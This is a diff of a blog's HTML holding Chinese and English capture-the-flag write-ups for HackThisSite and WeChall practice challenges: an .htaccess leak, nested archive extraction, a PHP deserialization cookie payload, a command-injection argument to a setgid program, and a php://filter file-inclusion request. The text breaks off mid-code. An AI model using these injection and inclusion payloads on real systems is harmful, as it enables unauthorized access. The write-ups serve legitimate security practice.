-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/missions/basic/11/e/</span><br><span class="line">/missions/basic/11/e/l/</span><br><span class="line">/missions/basic/11/e/l/t/</span><br><span class="line">/missions/basic/11/e/l/t/o/</span><br><span class="line">/missions/basic/11/e/l/t/o/n/    ← 最后一层，看起来是空的</span><br></pre></td></tr></table></figure>
-<h4 id="step-3查看-.htaccess-文件">Step 3：查看 .htaccess 文件</h4>
-<p><code>/e/l/t/o/n/</code> 目录看起来是空的，但在 Apache
-中，<code>.htaccess</code> 文件可能被目录列表隐藏了。直接访问：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.hackthissite.org/missions/basic/11/e/l/t/o/n/.htaccess</span><br></pre></td></tr></table></figure>
-<p>内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IndexIgnore DaAnswer.* .htaccess</span><br><span class="line"></span><br><span class="line">&lt;Files .htaccess&gt;</span><br><span class="line">require all granted</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure>
-<ul>
-<li><code>IndexIgnore</code>：告诉 Apache 目录列表中不要显示
-<code>DaAnswer.*</code> 和 <code>.htaccess</code></li>
-<li><code>&lt;Files .htaccess&gt;</code>：允许所有人访问
-<code>.htaccess</code>（这是关键错误，应该禁止访问）</li>
-</ul>
-<h4 id="step-4访问-daanswer">Step 4：访问 DaAnswer</h4>
-<p>既然 <code>.htaccess</code> 泄露了隐藏的文件名，直接访问：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.hackthissite.org/missions/basic/11/e/l/t/o/n/DaAnswer</span><br></pre></td></tr></table></figure>
-<p>页面显示动态文本，如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The answer is available!</span><br><span class="line">Just look a little harder.</span><br></pre></td></tr></table></figure>
-<h4 id="step-5提交答案">Step 5：提交答案</h4>
-<p>访问
-<code>/missions/basic/11/index.php</code>（注意不是入口页面），会出现密码输入框。表单字段名是
-<code>answer</code>，提交 <code>available</code> 即可过关。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sL -b <span class="string">&#x27;HackThisSite=YOUR_COOKIE&#x27;</span> \</span><br><span class="line">    -e <span class="string">&#x27;https://www.hackthissite.org/missions/basic/11/index.php&#x27;</span> \</span><br><span class="line">    --data-urlencode <span class="string">&#x27;answer=available&#x27;</span> \</span><br><span class="line">    <span class="string">&#x27;https://www.hackthissite.org/missions/basic/11/index.php&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>核心知识点：</p>
-<ol type="1">
-<li>Apache 的 <code>IndexIgnore</code>
-只是不在目录列表中显示文件，文件本身仍然可以被直接访问</li>
-<li><code>.htaccess</code>
-文件应该禁止外部访问（<code>Require all denied</code>），否则会泄露目录配置信息</li>
-<li>路径遍历 + 配置文件泄露是经典的 Apache 安全问题</li>
-</ol>
+<p>Extract the trailing data and decompress with
+<code>uncompress</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -c &quot;</span><br><span class="line">with open(&#x27;r.zip&#x27;,&#x27;rb&#x27;) as f:</span><br><span class="line">    d=f.read()</span><br><span class="line">open(&#x27;trailing.Z&#x27;,&#x27;wb&#x27;).write(d[440:])</span><br><span class="line">&quot;</span><br><span class="line">$ uncompress -c trailing.Z &gt; stage1.xar</span><br><span class="line">$ file stage1.xar</span><br><span class="line">stage1.xar: xar archive compressed TOC</span><br></pre></td></tr></table></figure>
+<p><strong>Step 2 — Extract the chain</strong></p>
+<p>The XAR contains file "8", which is itself LZW-compressed:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ xar -xf stage1.xar       # extract → file &quot;8&quot;</span><br><span class="line">$ uncompress -c 8 &gt; stage2.rar</span><br></pre></td></tr></table></figure>
+<p>Then continue extracting each layer with 7z or the appropriate
+tool:</p>
+<table>
+<colgroup>
+<col style="width: 12%" />
+<col style="width: 29%" />
+<col style="width: 19%" />
+<col style="width: 38%" />
+</colgroup>
+<thead>
+<tr>
+<th>Layer</th>
+<th>Format</th>
+<th>Tool</th>
+<th>Contains</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>r.zip tail</td>
+<td>LZW (.Z)</td>
+<td>uncompress</td>
+<td>XAR archive</td>
+</tr>
+<tr>
+<td>XAR</td>
+<td>xar</td>
+<td>xar / Python</td>
+<td>file "8" (LZW)</td>
+</tr>
+<tr>
+<td>file 8</td>
+<td>LZW (.Z)</td>
+<td>uncompress</td>
+<td>RAR archive</td>
+</tr>
+<tr>
+<td>RAR</td>
+<td>rar</td>
+<td>7z</td>
+<td>file "A" (XZ)</td>
+</tr>
+<tr>
+<td>XZ</td>
+<td>xz</td>
+<td>7z</td>
+<td>file "A~" (ZOO)</td>
+</tr>
+<tr>
+<td>ZOO</td>
+<td>zoo</td>
+<td>unar</td>
+<td>file "4" (RZIP)</td>
+</tr>
+<tr>
+<td>RZIP</td>
+<td>rzip → ZZ0 → gzip → ARJ</td>
+<td>uncompress + 7z</td>
+<td>file "1" (ARJ → "3")</td>
+</tr>
+<tr>
+<td>ARJ</td>
+<td>arj</td>
+<td>7z</td>
+<td>file "3" (LZW)</td>
+</tr>
+<tr>
+<td>file 3</td>
+<td>LZW (.Z)</td>
+<td>uncompress</td>
+<td>7z archive</td>
+</tr>
+<tr>
+<td>7z</td>
+<td>7z</td>
+<td>7z</td>
+<td>file "F" (bzip2)</td>
+</tr>
+<tr>
+<td>bzip2</td>
+<td>bz2</td>
+<td>bunzip2</td>
+<td><code>L0LYouThInkiTSh0uldB3SoEasY?</code></td>
+</tr>
+</tbody>
+</table>
+<p>The full extraction chain is:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">r.zip</span><br><span class="line"> ├─ r/r.zip (infinite recursion, ignore)</span><br><span class="line"> └─ trailing LZW data</span><br><span class="line">    └─ XAR → 8(LZW) → RAR → A(XZ) → A~(ZOO) → 4(RZIP)</span><br><span class="line">       └─ ZZ0(gzip) → 1(ARJ) → 3(LZW) → 7z → F(bzip2)</span><br><span class="line">          └─ &quot;L0LYouThInkiTSh0uldB3SoEasY?&quot; (password)</span><br></pre></td></tr></table></figure>
+<p>This showcases the depth of archive format history — ZIP, LZW
+compress, XAR, RAR, XZ, ZOO, RZIP, GZip, ARJ, 7z, bzip2 — almost every
+compression format ever invented.</p>
 
       
     </div>
@@ -595,7 +1601,7 @@ understand Apache.</p>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-are-you-serial/">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-malware/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -613,7 +1619,7 @@ understand Apache.</p>
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-are-you-serial/" class="post-title-link" itemprop="url">WeChall - Are you serial</a>
+          <a href="/wp/WeChall/wechall-malware/" class="post-title-link" itemprop="url">WeChall - Malware</a>
         </h2>
 
         <div class="post-meta-container">
@@ -624,542 +1630,7 @@ understand Apache.</p>
       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2026-06-09 17:36:27" itemprop="dateCreated datePublished" datetime="2026-06-09T17:36:27+08:00">2026-06-09</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-08 22:40:47" itemprop="dateModified" datetime="2026-09-08T22:40:47+08:00">2026-09-08</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-are-you-serial/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-are-you-serial/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p>PHP 反序列化漏洞。页面显示多个源码文件，需要通过操控
-<code>serial_user</code> cookie 触发
-<code>SERIAL_Solution::__wakeup()</code> 调用
-<code>onChallengeSolved()</code>。</p>
-<h3 id="solution">Solution</h3>
-<p>源码结构:</p>
-<ul>
-<li><code>code.php</code>: 读取 <code>serial_user</code> cookie，调用
-<code>unserialize()</code>，然后用结果调用
-<code>getUsername()</code>/<code>getPassword()</code>/<code>getUserlevel()</code></li>
-<li><code>SERIAL_Solution.php</code>: <code>__wakeup()</code> 方法调用
-<code>onChallengeSolved()</code></li>
-<li><code>SERIAL_User.php</code>: 包含 <code>username</code>,
-<code>password</code>, <code>userlevel</code> 属性</li>
-</ul>
-<p>核心漏洞: <code>unserialize()</code> 会实例化 cookie
-中指定的类。如果反序列化 <code>SERIAL_Solution</code>
-对象，<code>__wakeup()</code> 会自动触发。</p>
-<p>Payload (设置为 <code>serial_user</code> cookie):</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:16:&quot;SERIAL_Solution&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure>
-<p>使用 curl 提交:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -b <span class="string">&#x27;WC=&lt;session&gt;; serial_user=O%3A16%3A%22SERIAL_Solution%22%3A0%3A%7B%7D&#x27;</span> \</span><br><span class="line">    <span class="string">&#x27;https://www.wechall.net/en/challenge/are_you_serial/index.php&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>注意: <code>__wakeup()</code> 触发后，代码继续调用
-<code>getUsername()</code> 等方法可能导致 fatal error。如果 curl
-不生效，尝试通过浏览器 cookie 注入。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-choose-your-path/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-choose-your-path/" class="post-title-link" itemprop="url">WeChall - Choose your Path</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-06-09 17:35:46" itemprop="dateCreated datePublished" datetime="2026-06-09T17:35:46+08:00">2026-06-09</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-15 10:08:14" itemprop="dateModified" datetime="2026-09-15T10:08:14+08:00">2026-09-15</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-choose-your-path/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-choose-your-path/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<blockquote>
-<p>This is the level10 mini challenge found in
-<code>/home/level/10/</code> on the warchall box. You can view the
-source here. 这是 Warchall 服务器上的 Level 10 小挑战，目录在
-<code>/home/level/10/</code>（当前服务器实际目录名为
-<code>/home/level/10_choose_your_path/</code>），题目页面给出了源码。</p>
-</blockquote>
-<p>题目程序 <code>charp</code>
-会统计一个文件的平均每行字符数。源码核心逻辑如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 256</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *fp;</span><br><span class="line">  <span class="type">char</span> buf[BUFSIZE];</span><br><span class="line">  <span class="type">char</span> *filename;</span><br><span class="line">  <span class="type">int</span> lines, chars, cpl;</span><br><span class="line"></span><br><span class="line">  setregid(<span class="number">510</span>,<span class="number">510</span>); <span class="comment">// set real and effective GID to level10</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Usage: %s filename\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  filename = argv[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">snprintf</span>(buf, BUFSIZE, <span class="string">&quot;/usr/bin/wc -l %s&quot;</span>, filename) &gt;= BUFSIZE) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Filename %s is too long!\n&quot;</span>, filename);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fp = popen(buf, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="built_in">fscanf</span>(fp, <span class="string">&quot;%d&quot;</span>, &amp;lines);</span><br><span class="line">  pclose(fp);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">snprintf</span>(buf, BUFSIZE, <span class="string">&quot;/usr/bin/wc -c %s&quot;</span>, filename);</span><br><span class="line">  fp = popen(buf, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="built_in">fscanf</span>(fp, <span class="string">&quot;%d&quot;</span>, &amp;chars);</span><br><span class="line">  pclose(fp);</span><br><span class="line"></span><br><span class="line">  cpl = chars / lines;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Chars per line is %d.\n&quot;</span>, cpl);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>目录里有两个关键文件：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> -la /home/level/10_choose_your_path/</span><br><span class="line">-rwxr-sr-x  1 level10 level10 16392 Jan  3  2023 charp</span><br><span class="line">-rw-r--r--  1 root    level10  1303 Jan  3  2023 charp.c</span><br><span class="line">-rw-rw----  1 root    level10   171 Jan  3  2023 solution.txt</span><br></pre></td></tr></table></figure>
-<p><code>solution.txt</code> 对普通用户不可读，但 <code>charp</code> 有
-setgid bit：执行时有效 group 变成
-<code>level10</code>，所以它能读这个文件。</p>
-<h3 id="solution">Solution</h3>
-<p>关键约束：</p>
-<ul>
-<li>程序确实用绝对路径 <code>/usr/bin/wc</code>，所以不能通过
-<code>PATH</code> 劫持 <code>wc</code>。</li>
-<li>但它把用户输入的 <code>filename</code> 直接拼进 shell 命令，再交给
-<code>popen()</code> 执行。</li>
-<li><code>popen()</code> 等价于让 <code>/bin/sh -c</code>
-执行字符串，因此 <code>;</code>, <code>|</code>, <code>#</code>,
-redirection 都会被 shell 解析。</li>
-</ul>
-<p>也就是说，这不是文件路径选择问题，而是 command injection。</p>
-<p>程序第一次执行的命令形如：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/wc -l &lt;filename&gt;</span><br></pre></td></tr></table></figure>
-<p>如果把 <code>&lt;filename&gt;</code> 传成：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">solution.txt 1&gt;&amp;2; /bin/cat solution.txt 1&gt;&amp;2; #</span><br></pre></td></tr></table></figure>
-<p>实际命令会变成：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/wc -l solution.txt 1&gt;&amp;2; /bin/cat solution.txt 1&gt;&amp;2; <span class="comment">#</span></span><br></pre></td></tr></table></figure>
-<p>解释：</p>
-<ul>
-<li><code>solution.txt</code> 作为正常参数，让 <code>wc</code>
-不至于立刻失败。</li>
-<li><code>1&gt;&amp;2</code> 把 stdout 重定向到
-stderr。<code>charp</code> 会从 <code>popen()</code> 的 stdout
-里读取数字；如果把注入命令的输出留在 stdout，可能干扰
-<code>fscanf()</code>。</li>
-<li><code>; /bin/cat solution.txt 1&gt;&amp;2</code> 追加执行
-<code>cat</code>，借助 setgid 权限读取答案，并输出到 stderr。</li>
-<li><code>#</code> 注释掉后面可能拼接出的残余命令片段。</li>
-</ul>
-<p>Live 验证命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -p 19198 &lt;username&gt;@warchall.net</span><br><span class="line">$ <span class="built_in">cd</span> /home/level/10_choose_your_path</span><br><span class="line">$ ./charp <span class="string">&quot;solution.txt 1&gt;&amp;2; /bin/cat solution.txt 1&gt;&amp;2; #&quot;</span></span><br><span class="line">8 solution.txt</span><br><span class="line"><span class="comment">#!/C:\windows\system32\ed</span></span><br><span class="line"></span><br><span class="line">Congratulations hacker,</span><br><span class="line"></span><br><span class="line">You have achieved what only a few achieve.</span><br><span class="line">Kinda.</span><br><span class="line"></span><br><span class="line">The flag or solution <span class="keyword">for</span> this challenge is: &lt;masked&gt;</span><br><span class="line">Cannot scan! Sorry!</span><br><span class="line">171 solution.txt</span><br><span class="line"><span class="comment">#!/C:\windows\system32\ed</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<p>输出会出现两次，是因为程序先执行 <code>wc -l</code>，再执行
-<code>wc -c</code>，两次 <code>popen()</code> 都会拼接同一个
-<code>filename</code>，所以注入的 <code>cat solution.txt</code>
-也被执行两次。</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">EpidermalGlance</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-warchall-live-lfi/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-warchall-live-lfi/" class="post-title-link" itemprop="url">WeChall - Warchall - Live LFI</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-06-09 17:11:16" itemprop="dateCreated datePublished" datetime="2026-06-09T17:11:16+08:00">2026-06-09</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-08 22:40:47" itemprop="dateModified" datetime="2026-09-08T22:40:47+08:00">2026-09-08</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-warchall-live-lfi/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-warchall-live-lfi/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<blockquote>
-<p>One reason why I wanted the warchall box is to offer more realistic
-webhacking challenges. You may now try the Live LFI challenge that is
-hosted on it. Good Luck! Warchall 服务器上托管了更接近真实环境的 Web
-hacking 题目。这个挑战是 Live LFI。</p>
-</blockquote>
-<p>WeChall 页面本身只给出入口和提交框，真正的目标站点是：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lfi.warchall.net/index.php</span><br></pre></td></tr></table></figure>
-<p>打开页面后可以看到语言切换链接：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;index.php?lang=en&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;english.png&quot;</span> <span class="attr">title</span>=<span class="string">&quot;English&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;EN&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;index.php?lang=de&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;german.png&quot;</span> <span class="attr">title</span>=<span class="string">&quot;German&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;DE&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>关键点是 <code>lang</code>
-参数。正常情况下它用于选择语言文件，但如果后端直接把它拼进
-<code>include</code>，就可能变成 Local File Inclusion。</p>
-<h3 id="solution">Solution</h3>
-<p>先做 baseline：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s <span class="string">&#x27;https://lfi.warchall.net/index.php?lang=en&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>页面正常返回英文内容。然后测试 <code>lang</code> 是否能影响 include
-目标。这里不需要 SSH，也不需要在服务器上找文件；直接利用 PHP stream
-wrapper 读取当前目录下的 <code>solution.php</code> 源码即可。</p>
-<p>payload：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php</span><br></pre></td></tr></table></figure>
-<p>为什么用 <code>php://filter</code>：</p>
-<ul>
-<li>直接访问 <code>solution.php</code> 只能看到它输出的 HTML，PHP
-代码会被服务器执行，不会显示源码。</li>
-<li>LFI 触发的是后端 <code>include</code>，如果包含
-<code>solution.php</code>，里面的 PHP 仍然会执行，源码同样不可见。</li>
-<li><code>php://filter/convert.base64-encode/resource=solution.php</code>
-会让 PHP 在读取文件时先把文件内容 base64 编码。这样 include
-得到的是纯文本 base64，不会被当作 PHP 代码执行。</li>
-</ul>
-<p>实际请求：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s <span class="string">&#x27;https://lfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php&#x27;</span></span><br><span class="line">PGh0bWw+Cjxib2R5Pgo8cHJlIHN0eWxlPSJjb2xvcjojMDAwOyI+dGVoIGZhbGcgc2kgbmFlciE8L3ByZT4K...</span><br></pre></td></tr></table></figure>
-<p>把开头连续的 base64 部分解码：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ python3 - &lt;&lt;<span class="string">&#x27;PY&#x27;</span></span><br><span class="line">import <span class="built_in">base64</span>, re, urllib.request</span><br><span class="line">url = <span class="string">&#x27;https://lfi.warchall.net/index.php?lang=php://filter/convert.base64-encode/resource=solution.php&#x27;</span></span><br><span class="line">data = urllib.request.urlopen(url, <span class="built_in">timeout</span>=10).<span class="built_in">read</span>()</span><br><span class="line">b64 = re.match(rb<span 